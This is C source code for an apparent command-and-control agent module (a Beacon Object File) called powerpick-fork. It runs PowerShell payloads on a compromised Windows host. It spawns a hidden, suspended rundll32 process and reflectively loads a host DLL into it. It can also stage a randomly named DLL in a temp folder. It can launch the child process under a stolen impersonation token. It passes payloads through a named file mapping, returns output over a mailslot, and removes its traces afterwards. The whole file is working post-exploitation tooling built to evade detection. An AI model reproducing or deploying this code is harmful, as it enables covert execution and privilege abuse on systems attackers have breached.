/*
 * powerpick-fork agent BOF:
 *   mailslot + payload mapping -> CreateProcess(rundll32 "host.dll",PowerPickForkRun map)
 *   -> wait / read mailslot -> cleanup
 *
 * Inject-into-RuntimeBroker was abandoned for MVP after 0xC0000005 crashes under
 * suspended LoadLibrary; rundll32 is still Microsoft-signed and loads the host
 * through a normal export call.
 */
#include <windows.h>
#include "beacon.h"
#include "powerpick_fork_bof.h"

/* MinGW may still emit stack probes; BOFs have no CRT to resolve them. */
void ___chkstk_ms(void) {}
void __chkstk_ms(void) {}

void gen_rand_str(char* buffer, int offset, int length)
{
    unsigned char randomBytes[TMPBUFLEN];
    RTLGENRANDOM pRtlGenRandom = (RTLGENRANDOM)KERNEL32$GetProcAddress(
        KERNEL32$LoadLibraryA("advapi32.dll"),
        "SystemFunction036");
    if (!pRtlGenRandom || !pRtlGenRandom(randomBytes, TMPBUFLEN)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] gen_rand_str: RtlGenRandom failed");
        return;
    }

    int end = offset + length;
    if (end > TMPBUFLEN) {
        end = TMPBUFLEN;
    }

    for (int i = offset; i < end; i++) {
        unsigned char val = randomBytes[i] % 26;
        buffer[i] = 'A' + val;
    }
    buffer[end] = '\0';
}

static BOOL MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
    *mailHandle = KERNEL32$CreateMailslotA(
        lpszSlotName,
        0,
        MAILSLOT_WAIT_FOREVER,
        (LPSECURITY_ATTRIBUTES)NULL);
    return *mailHandle != INVALID_HANDLE_VALUE;
}

static BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE* hEventOut)
{
    DWORD cbMessage = 0;
    DWORD cMessage = 0;
    DWORD cbRead = 0;
    BOOL fResult;
    LPSTR lpszBuffer = NULL;
    HANDLE hEvent;
    OVERLAPPED ov;
    size_t totalWritten = 0;
    BOOL chunkingMode = FALSE;
    char* chunkBuffer = NULL;
    size_t chunkBufferSize = CHUNK_SIZE;
    size_t chunkBufferUsed = 0;

    hEvent = KERNEL32$CreateEventA(NULL, FALSE, FALSE, NULL);
    if (hEvent == NULL) {
        return FALSE;
    }
    *hEventOut = hEvent;

    ov.Offset = 0;
    ov.OffsetHigh = 0;
    ov.hEvent = hEvent;

    while (TRUE) {
        fResult = KERNEL32$GetMailslotInfo(
            *mailHandle,
            (LPDWORD)NULL,
            &cbMessage,
            &cMessage,
            (LPDWORD)NULL);
        if (!fResult) {
            if (chunkBuffer) {
                MSVCRT$free(chunkBuffer);
            }
            KERNEL32$CloseHandle(hEvent);
            return FALSE;
        }

        if (cbMessage == MAILSLOT_NO_MESSAGE) {
            break;
        }

        lpszBuffer = (LPSTR)KERNEL32$GlobalAlloc(GPTR, cbMessage + 1);
        if (lpszBuffer == NULL) {
            if (chunkBuffer) {
                MSVCRT$free(chunkBuffer);
            }
            KERNEL32$CloseHandle(hEvent);
            return FALSE;
        }

        fResult = KERNEL32$ReadFile(*mailHandle, lpszBuffer, cbMessage, &cbRead, &ov);
        if (!fResult) {
            KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
            if (chunkBuffer) {
                MSVCRT$free(chunkBuffer);
            }
            KERNEL32$CloseHandle(hEvent);
            return FALSE;
        }

        lpszBuffer[cbRead] = '\0';
        size_t msgLen = MSVCRT$strlen(lpszBuffer);
        BOOL hasNewline = FALSE;
        if (msgLen > 0 &&
            (lpszBuffer[msgLen - 1] == '\n' || lpszBuffer[msgLen - 1] == '\r')) {
            hasNewline = TRUE;
        }

        if (!chunkingMode && totalWritten + msgLen + (hasNewline ? 0 : 1) < outputSize - 1) {
            MSVCRT$memcpy(output + totalWritten, lpszBuffer, msgLen);
            totalWritten += msgLen;
            if (!hasNewline && msgLen > 0) {
                output[totalWritten++] = '\n';
            }
            output[totalWritten] = '\0';
        } else {
            if (!chunkingMode) {
                chunkingMode = TRUE;
                output[totalWritten] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "%s", output);
                chunkBuffer = (char*)MSVCRT$malloc(chunkBufferSize);
                if (!chunkBuffer) {
                    KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
                    KERNEL32$CloseHandle(hEvent);
                    return FALSE;
                }
                chunkBufferUsed = 0;
            }

            size_t neededSpace = msgLen + (hasNewline ? 0 : 1);
            size_t spaceLeft = chunkBufferSize - chunkBufferUsed - 1;

            if (neededSpace <= spaceLeft) {
                MSVCRT$memcpy(chunkBuffer + chunkBufferUsed, lpszBuffer, msgLen);
                chunkBufferUsed += msgLen;
                if (!hasNewline && msgLen > 0) {
                    chunkBuffer[chunkBufferUsed++] = '\n';
                }
                chunkBuffer[chunkBufferUsed] = '\0';
                if (chunkBufferUsed > (chunkBufferSize * 3 / 4)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
                    chunkBufferUsed = 0;
                    chunkBuffer[0] = '\0';
                }
            } else {
                if (chunkBufferUsed > 0) {
                    chunkBuffer[chunkBufferUsed] = '\0';
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
                    chunkBufferUsed = 0;
                }
                if (neededSpace >= chunkBufferSize - 1) {
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", lpszBuffer);
                    if (!hasNewline) {
                        BeaconPrintf(CALLBACK_OUTPUT, "\n");
                    }
                } else {
                    MSVCRT$memcpy(chunkBuffer, lpszBuffer, msgLen);
                    chunkBufferUsed = msgLen;
                    if (!hasNewline && msgLen > 0) {
                        chunkBuffer[chunkBufferUsed++] = '\n';
                    }
                    chunkBuffer[chunkBufferUsed] = '\0';
                }
            }
        }

        KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
    }

    if (chunkingMode) {
        if (chunkBufferUsed > 0) {
            chunkBuffer[chunkBufferUsed] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
        }
        MSVCRT$free(chunkBuffer);
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }

    KERNEL32$CloseHandle(hEvent);
    return !chunkingMode;
}

static BOOL AsciiToWide(const char* ascii, wchar_t* out, int outChars)
{
    if (!ascii || !out || outChars <= 0) {
        return FALSE;
    }
    return KERNEL32$MultiByteToWideChar(CP_ACP, 0, ascii, -1, out, outChars) > 0;
}

static BOOL EndsWithIgnoreCase(const char* path, const char* suffix)
{
    size_t pathLen;
    size_t suffixLen;
    size_t i;
    if (!path || !suffix) {
        return FALSE;
    }
    pathLen = MSVCRT$strlen(path);
    suffixLen = MSVCRT$strlen(suffix);
    if (suffixLen > pathLen) {
        return FALSE;
    }
    for (i = 0; i < suffixLen; i++) {
        char a = path[pathLen - suffixLen + i];
        char b = suffix[i];
        if (a >= 'A' && a <= 'Z') {
            a = (char)(a - 'A' + 'a');
        }
        if (b >= 'A' && b <= 'Z') {
            b = (char)(b - 'A' + 'a');
        }
        if (a != b) {
            return FALSE;
        }
    }
    return TRUE;
}

static BOOL WriteTempDll(
    const char* dllBytes,
    int dllLen,
    char* outPath,
    size_t outPathLen,
    BOOL useWindowsTemp)
{
    char tempDir[MAX_PATH];
    char name[TMPBUFLEN] = { 'p', 'p', 'f' };
    DWORD n;
    HANDLE hFile;
    DWORD written = 0;
    BOOL ok;

    if (dllBytes == NULL || dllLen <= 0) {
        return FALSE;
    }

    if (useWindowsTemp) {
        /* Cross-session impersonation often cannot read the agent's %TEMP%. */
        n = KERNEL32$GetWindowsDirectoryA(tempDir, (UINT)sizeof(tempDir));
        if (n == 0 || n >= sizeof(tempDir) - 6) {
            return FALSE;
        }
        MSVCRT$_snprintf(tempDir + n, sizeof(tempDir) - n, "\\Temp\\");
    } else {
        n = KERNEL32$GetTempPathA((DWORD)sizeof(tempDir), tempDir);
        if (n == 0 || n >= sizeof(tempDir)) {
            return FALSE;
        }
    }

    gen_rand_str(name, 3, 8);
    MSVCRT$_snprintf(outPath, outPathLen, "%s%s.dll", tempDir, name);

    hFile = KERNEL32$CreateFileA(
        outPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    ok = KERNEL32$WriteFile(hFile, dllBytes, (DWORD)dllLen, &written, NULL);
    KERNEL32$CloseHandle(hFile);
    if (!ok || written != (DWORD)dllLen) {
        KERNEL32$DeleteFileA(outPath);
        return FALSE;
    }
    return TRUE;
}

static BOOL PpfCreateSacrificial(
    BOOL useImpersonate,
    wchar_t* loaderW,
    wchar_t* cmdW,
    DWORD creationFlags,
    LPSTARTUPINFOW si,
    LPPROCESS_INFORMATION pi)
{
    HANDLE hThreadToken = NULL;
    HANDLE hPrimary = NULL;
    BOOL ok;
    DWORD errWithToken = 0;
    DWORD errAsUser = 0;

    if (!useImpersonate) {
        return KERNEL32$CreateProcessW(
            loaderW,
            cmdW,
            NULL,
            NULL,
            FALSE,
            creationFlags,
            NULL,
            NULL,
            si,
            pi);
    }

    if (!ADVAPI32$OpenThreadToken(
            KERNEL32$GetCurrentThread(),
            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
                TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_IMPERSONATE,
            FALSE,
            &hThreadToken)) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "[!] --impersonate set but no thread impersonation token (err=%lu)",
            KERNEL32$GetLastError());
        return FALSE;
    }

    if (!ADVAPI32$DuplicateTokenEx(
            hThreadToken,
            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
                TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_IMPERSONATE,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            &hPrimary)) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "[!] DuplicateTokenEx failed (err=%lu)",
            KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hThreadToken);
        return FALSE;
    }

    /*
     * CreateProcessAsUser needs SeAssignPrimaryTokenPrivilege (usually SYSTEM).
     * CreateProcessWithTokenW needs SeImpersonatePrivilege (typical for steal_token).
     * Prefer WithToken; fall back to AsUser for SYSTEM agents.
     */
    ok = ADVAPI32$CreateProcessWithTokenW(
        hPrimary,
        0,
        loaderW,
        cmdW,
        creationFlags,
        NULL,
        NULL,
        si,
        pi);
    if (!ok) {
        errWithToken = KERNEL32$GetLastError();
        ok = ADVAPI32$CreateProcessAsUserW(
            hPrimary,
            loaderW,
            cmdW,
            NULL,
            NULL,
            FALSE,
            creationFlags,
            NULL,
            NULL,
            si,
            pi);
        if (!ok) {
            errAsUser = KERNEL32$GetLastError();
            BeaconPrintf(
                CALLBACK_ERROR,
                "[!] CreateProcessWithToken failed (err=%lu); CreateProcessAsUser failed (err=%lu)",
                errWithToken,
                errAsUser);
        }
    }

    KERNEL32$CloseHandle(hPrimary);
    KERNEL32$CloseHandle(hThreadToken);
    return ok;
}

#include "powerpick_fork_reflect.h"

typedef struct _PPF_IMPORT_BLOB {
    DWORD length;
    BYTE data[1];
} PPF_IMPORT_BLOB, *PPPF_IMPORT_BLOB;

static void PpfMakeImportKey(char* outKey, size_t outLen, const char* name)
{
    size_t nameLen;
    if (name == NULL || outLen < PPF_IMPORT_KEY_PREFIX_LEN + 2) {
        outKey[0] = '\0';
        return;
    }
    nameLen = MSVCRT$strlen(name);
    if (outLen < PPF_IMPORT_KEY_PREFIX_LEN + nameLen + 1) {
        outKey[0] = '\0';
        return;
    }
    MSVCRT$memcpy(outKey, PPF_IMPORT_KEY_PREFIX, PPF_IMPORT_KEY_PREFIX_LEN);
    MSVCRT$memcpy(outKey + PPF_IMPORT_KEY_PREFIX_LEN, name, nameLen + 1);
}

static BOOL PpfStoreImport(const char* name, char* payload, int payloadLen)
{
    char key[96];
    PPPF_IMPORT_BLOB existing;
    PPPF_IMPORT_BLOB blob;
    SIZE_T allocSize;

    if (name == NULL || name[0] == '\0' || payload == NULL || payloadLen <= 0) {
        return FALSE;
    }

    PpfMakeImportKey(key, sizeof(key), name);
    if (key[0] == '\0') {
        return FALSE;
    }

    existing = (PPPF_IMPORT_BLOB)BeaconGetValue(key);
    if (existing != NULL) {
        BeaconRemoveValue(key);
        intFree(existing);
    }

    allocSize = sizeof(DWORD) + (SIZE_T)payloadLen;
    blob = (PPPF_IMPORT_BLOB)intAlloc(allocSize);
    if (blob == NULL) {
        return FALSE;
    }

    blob->length = (DWORD)payloadLen;
    MSVCRT$memcpy(blob->data, payload, payloadLen);

    if (!BeaconAddValue(key, blob)) {
        intFree(blob);
        return FALSE;
    }
    return TRUE;
}

static BOOL PpfDropImport(const char* name)
{
    char key[96];
    PPPF_IMPORT_BLOB existing;

    if (name == NULL || name[0] == '\0') {
        return FALSE;
    }
    PpfMakeImportKey(key, sizeof(key), name);
    if (key[0] == '\0') {
        return FALSE;
    }
    existing = (PPPF_IMPORT_BLOB)BeaconGetValue(key);
    if (existing == NULL) {
        return FALSE;
    }
    BeaconRemoveValue(key);
    intFree(existing);
    return TRUE;
}

static void PpfHandleStore(datap* parser)
{
    char* name = BeaconDataExtract(parser, NULL);
    char* payload = NULL;
    int payloadLen = 0;

    if (BeaconDataLength(parser) > 0) {
        payload = BeaconDataExtract(parser, &payloadLen);
    }
    if (name == NULL || name[0] == '\0' || payload == NULL || payloadLen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] store requires a name and script payload");
        return;
    }
    if (!PpfStoreImport(name, payload, payloadLen)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] failed to store session import '%s'", name);
        return;
    }
    BeaconPrintf(
        CALLBACK_OUTPUT,
        "Stored session import '%s' (%d bytes) in agent memory\n",
        name,
        payloadLen);
}

static void PpfHandleDrop(datap* parser)
{
    char* names = BeaconDataExtract(parser, NULL);
    char* cursor;
    int dropped = 0;

    if (names == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] drop requires import name(s) or 'all'");
        return;
    }

    cursor = names;
    while (*cursor != '\0') {
        char* nameStart;
        char* nameEnd;
        char saved;
        while (*cursor == ' ') {
            cursor++;
        }
        if (*cursor == '\0') {
            break;
        }
        nameStart = cursor;
        while (*cursor != '\0' && *cursor != ' ') {
            cursor++;
        }
        nameEnd = cursor;
        saved = *nameEnd;
        *nameEnd = '\0';
        if (PpfDropImport(nameStart)) {
            dropped++;
            BeaconPrintf(CALLBACK_OUTPUT, "Dropped session import '%s'\n", nameStart);
        } else {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[!] session import '%s' was not cached on the agent\n",
                nameStart);
        }
        *nameEnd = saved;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Dropped %d session import(s)\n", dropped);
}

static int PpfResolveImportNames(
    char* managedArgs,
    PPPF_IMPORT_BLOB* outImports,
    int maxImports,
    char* outExecArgs,
    size_t outExecArgsLen)
{
    char* cursor;
    int importCount = 0;
    size_t execLen = 0;

    outExecArgs[0] = '\0';
    if (managedArgs == NULL || MSVCRT$strncmp(managedArgs, "exec ", 5) != 0) {
        return -1;
    }

    cursor = managedArgs + 5;
    while (*cursor == ' ') {
        cursor++;
    }
    if (*cursor == '\0') {
        return -1;
    }

    /* First token is base64 command (no spaces). */
    {
        char* start = cursor;
        while (*cursor != '\0' && *cursor != ' ') {
            cursor++;
        }
        execLen = (size_t)(cursor - start);
        if (execLen + 6 >= outExecArgsLen) {
            return -1;
        }
        MSVCRT$memcpy(outExecArgs, "exec ", 5);
        MSVCRT$memcpy(outExecArgs + 5, start, execLen);
        outExecArgs[5 + execLen] = '\0';
    }

    while (*cursor != '\0' && importCount < maxImports) {
        char* nameStart;
        char saved;
        char key[96];
        PPPF_IMPORT_BLOB blob;

        while (*cursor == ' ') {
            cursor++;
        }
        if (*cursor == '\0') {
            break;
        }
        nameStart = cursor;
        while (*cursor != '\0' && *cursor != ' ') {
            cursor++;
        }
        saved = *cursor;
        *cursor = '\0';
        PpfMakeImportKey(key, sizeof(key), nameStart);
        blob = (PPPF_IMPORT_BLOB)BeaconGetValue(key);
        if (blob == NULL) {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[!] session import '%s' is not cached; re-run powerpick-load\n",
                nameStart);
            *cursor = saved;
            return -1;
        }
        outImports[importCount++] = blob;
        *cursor = saved;
    }

    return importCount;
}

void go(IN PCHAR buffer, IN ULONG blength)
{
    datap parser;
    char* op;
    char* spawnto;
    char* hostDll;
    int hostDllLen = 0;
    char* managedPe;
    int managedLen = 0;
    char* managedArgs;
    char* impersonateFlag = NULL;
    BOOL useImpersonate = FALSE;
    HANDLE hSavedImpersonation = NULL;
    BOOL revertedImpersonation = FALSE;
    char slotName[TMPBUFLEN] = { 'p', 'p', 'f', 's', '-' };
    char mapRand[TMPBUFLEN] = { 'p', 'p', 'f' };
    char slotPath[PPF_SLOT_MAX];
    char mapName[64];
    char dllPath[MAX_PATH];
    char loader[MAX_PATH];
    char execArgs[512];
    char* cmdA = NULL;
    wchar_t loaderW[MAX_PATH];
    wchar_t* cmdW = NULL;
    HANDLE hMail = INVALID_HANDLE_VALUE;
    HANDLE hMap = NULL;
    LPVOID mapView = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFOW si;
    char* returnData = NULL;
    HANDLE hEvent = NULL;
    BOOL createdProcess = FALSE;
    BOOL wroteDll = FALSE;
    DWORD argsLen;
    DWORD mapSize;
    DWORD wait;
    DWORD exitCode = STILL_ACTIVE;
    PPPF_IMPORT_BLOB imports[PPF_MAX_IMPORTS];
    int importCount = 0;
    int i;

    BeaconDataParse(&parser, buffer, blength);
    op = BeaconDataExtract(&parser, NULL);
    if (op == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick: missing operation");
        return;
    }

    if (MSVCRT$strncmp(op, "store", 5) == 0) {
        PpfHandleStore(&parser);
        return;
    }
    if (MSVCRT$strncmp(op, "drop", 4) == 0) {
        PpfHandleDrop(&parser);
        return;
    }
    if (MSVCRT$strncmp(op, "exec", 4) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick: unknown op '%s'", op);
        return;
    }

    spawnto = BeaconDataExtract(&parser, NULL);
    hostDll = BeaconDataExtract(&parser, &hostDllLen);
    managedPe = BeaconDataExtract(&parser, &managedLen);
    managedArgs = BeaconDataExtract(&parser, NULL);
    impersonateFlag = BeaconDataExtract(&parser, NULL);
    useImpersonate =
        (impersonateFlag != NULL &&
         impersonateFlag[0] == '1' &&
         impersonateFlag[1] == '\0');

    if (spawnto == NULL || spawnto[0] == '\0') {
        spawnto = PPF_DEFAULT_SPAWNTO;
    }
    if (hostDll == NULL || hostDllLen <= 0 ||
        managedPe == NULL || managedLen <= 0 ||
        managedArgs == NULL || managedArgs[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick: missing host DLL, managed PE, or args");
        return;
    }

    importCount = PpfResolveImportNames(
        managedArgs,
        imports,
        PPF_MAX_IMPORTS,
        execArgs,
        sizeof(execArgs));
    if (importCount < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick: invalid exec args / imports");
        return;
    }

    if (EndsWithIgnoreCase(spawnto, "rundll32.exe")) {
        MSVCRT$_snprintf(loader, sizeof(loader), "%s", spawnto);
    } else {
        MSVCRT$_snprintf(loader, sizeof(loader), "%s", PPF_DEFAULT_SPAWNTO);
    }

    /*
     * Running the BOF while the agent thread is impersonating (without
     * --impersonate) can crash the agent on CreateProcess / temp / mailslot
     * paths. Drop to the process primary token for this task, then restore.
     */
    if (!useImpersonate) {
        if (ADVAPI32$OpenThreadToken(
                KERNEL32$GetCurrentThread(),
                TOKEN_ALL_ACCESS,
                FALSE,
                &hSavedImpersonation)) {
            if (ADVAPI32$RevertToSelf()) {
                revertedImpersonation = TRUE;
            } else {
                KERNEL32$CloseHandle(hSavedImpersonation);
                hSavedImpersonation = NULL;
            }
        }
    }

    gen_rand_str(slotName, 5, 8);
    gen_rand_str(mapRand, 3, 8);
    MSVCRT$_snprintf(slotPath, sizeof(slotPath), "\\\\.\\mailslot\\%s", slotName);
    /* Global\ so a child in another session can still open the mapping. */
    if (useImpersonate) {
        MSVCRT$_snprintf(mapName, sizeof(mapName), "Global\\%s", mapRand);
    } else {
        MSVCRT$_snprintf(mapName, sizeof(mapName), "Local\\%s", mapRand);
    }

    MSVCRT$memset(&pi, 0, sizeof(pi));
    MSVCRT$memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!MakeSlot(slotPath, &hMail)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create mailslot (err=%lu)", KERNEL32$GetLastError());
        return;
    }

    argsLen = (DWORD)MSVCRT$strlen(execArgs);
    mapSize = 4 + PPF_SLOT_MAX + 4 + (DWORD)managedLen + 4 + argsLen + 4;
    for (i = 0; i < importCount; i++) {
        mapSize += 4 + imports[i]->length;
    }

    hMap = KERNEL32$CreateFileMappingA(
        INVALID_HANDLE_VALUE,
        NULL,
        PAGE_READWRITE,
        0,
        mapSize,
        mapName);
    if (!hMap) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create payload mapping (err=%lu)", KERNEL32$GetLastError());
        goto cleanup;
    }

    mapView = KERNEL32$MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, mapSize);
    if (!mapView) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to map payload view (err=%lu)", KERNEL32$GetLastError());
        goto cleanup;
    }

    {
        BYTE* p = (BYTE*)mapView;
        DWORD magic = PPF_MAGIC;
        DWORD asmLenDw = (DWORD)managedLen;
        DWORD importCountDw = (DWORD)importCount;
        DWORD offset = 0;

        MSVCRT$memset(p, 0, mapSize);
        MSVCRT$memcpy(p + offset, &magic, 4);
        offset += 4;
        MSVCRT$memcpy(p + offset, slotPath, MSVCRT$strlen(slotPath) + 1);
        offset += PPF_SLOT_MAX;
        MSVCRT$memcpy(p + offset, &asmLenDw, 4);
        offset += 4;
        MSVCRT$memcpy(p + offset, managedPe, (size_t)managedLen);
        offset += (DWORD)managedLen;
        MSVCRT$memcpy(p + offset, &argsLen, 4);
        offset += 4;
        MSVCRT$memcpy(p + offset, execArgs, argsLen);
        offset += argsLen;
        MSVCRT$memcpy(p + offset, &importCountDw, 4);
        offset += 4;
        for (i = 0; i < importCount; i++) {
            DWORD len = imports[i]->length;
            MSVCRT$memcpy(p + offset, &len, 4);
            offset += 4;
            MSVCRT$memcpy(p + offset, imports[i]->data, len);
            offset += len;
        }
    }

    cmdA = (char*)intAlloc(1024);
    cmdW = (wchar_t*)intAlloc(1024 * sizeof(wchar_t));
    if (!cmdA || !cmdW) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        goto cleanup;
    }

    if (!AsciiToWide(loader, loaderW, MAX_PATH)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert spawnto path");
        goto cleanup;
    }

    /* Prefer reflective host map into suspended rundll32 (no host DLL on disk). */
    MSVCRT$_snprintf(cmdA, 1024, "\"%s\"", loader);
    if (!AsciiToWide(cmdA, cmdW, 1024)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert rundll32 command line");
        goto cleanup;
    }

    if (PpfCreateSacrificial(
            useImpersonate,
            loaderW,
            cmdW,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            &si,
            &pi)) {
        createdProcess = TRUE;
        if (!PpfReflectHostDll(pi.hProcess, hostDll, hostDllLen, mapName)) {
            KERNEL32$TerminateProcess(pi.hProcess, 1);
            if (pi.hThread) {
                KERNEL32$CloseHandle(pi.hThread);
                pi.hThread = NULL;
            }
            if (pi.hProcess) {
                KERNEL32$CloseHandle(pi.hProcess);
                pi.hProcess = NULL;
            }
            createdProcess = FALSE;
        }
        /* Reflective thread runs the host; leave primary thread suspended. */
    }

    if (!createdProcess) {
        /* Fallback: stage host DLL + classic rundll32 export entry. */
        if (!WriteTempDll(
                hostDll, hostDllLen, dllPath, sizeof(dllPath), useImpersonate)) {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[!] Reflective host load failed and temp DLL stage failed (err=%lu)",
                KERNEL32$GetLastError());
            goto cleanup;
        }
        wroteDll = TRUE;

        MSVCRT$_snprintf(
            cmdA,
            1024,
            "\"%s\" \"%s\",PowerPickForkRun %s",
            loader,
            dllPath,
            mapName);
        if (!AsciiToWide(cmdA, cmdW, 1024)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert rundll32 command line");
            goto cleanup;
        }
        if (!PpfCreateSacrificial(
                useImpersonate,
                loaderW,
                cmdW,
                CREATE_NO_WINDOW,
                &si,
                &pi)) {
            goto cleanup;
        }
        createdProcess = TRUE;
    }

    wait = KERNEL32$WaitForSingleObject(pi.hProcess, PPF_WAIT_MS);
    if (wait == WAIT_TIMEOUT) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Sacrificial process timed out after %d seconds", PPF_WAIT_MS / 1000);
        KERNEL32$TerminateProcess(pi.hProcess, 1);
    }

    KERNEL32$GetExitCodeProcess(pi.hProcess, &exitCode);

    returnData = (char*)intAlloc(INITIAL_BUFFER_SIZE);
    if (!returnData) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        goto cleanup;
    }
    MSVCRT$memset(returnData, 0, INITIAL_BUFFER_SIZE);

    {
        BOOL bufferMode = ReadSlotHybrid(returnData, INITIAL_BUFFER_SIZE, &hMail, &hEvent);
        if (bufferMode) {
            if (returnData[0] != '\0') {
                BeaconPrintf(CALLBACK_OUTPUT, "%s", returnData);
            } else if (exitCode != 0) {
                BeaconPrintf(
                    CALLBACK_ERROR,
                    "[!] sacrificial host failed (exit=%lu)\n",
                    exitCode);
            }
        }
    }

cleanup:
    if (createdProcess) {
        if (pi.hThread) {
            KERNEL32$CloseHandle(pi.hThread);
        }
        if (pi.hProcess) {
            KERNEL32$CloseHandle(pi.hProcess);
        }
    }
    if (mapView) {
        KERNEL32$UnmapViewOfFile(mapView);
    }
    if (hMap) {
        KERNEL32$CloseHandle(hMap);
    }
    if (hMail != INVALID_HANDLE_VALUE) {
        KERNEL32$CloseHandle(hMail);
    }
    if (returnData) {
        intFree(returnData);
    }
    if (cmdA) {
        intFree(cmdA);
    }
    if (cmdW) {
        intFree(cmdW);
    }
    if (wroteDll) {
        KERNEL32$DeleteFileA(dllPath);
    }
    if (revertedImpersonation && hSavedImpersonation) {
        ADVAPI32$ImpersonateLoggedOnUser(hSavedImpersonation);
        KERNEL32$CloseHandle(hSavedImpersonation);
        hSavedImpersonation = NULL;
    } else if (hSavedImpersonation) {
        KERNEL32$CloseHandle(hSavedImpersonation);
        hSavedImpersonation = NULL;
    }
}
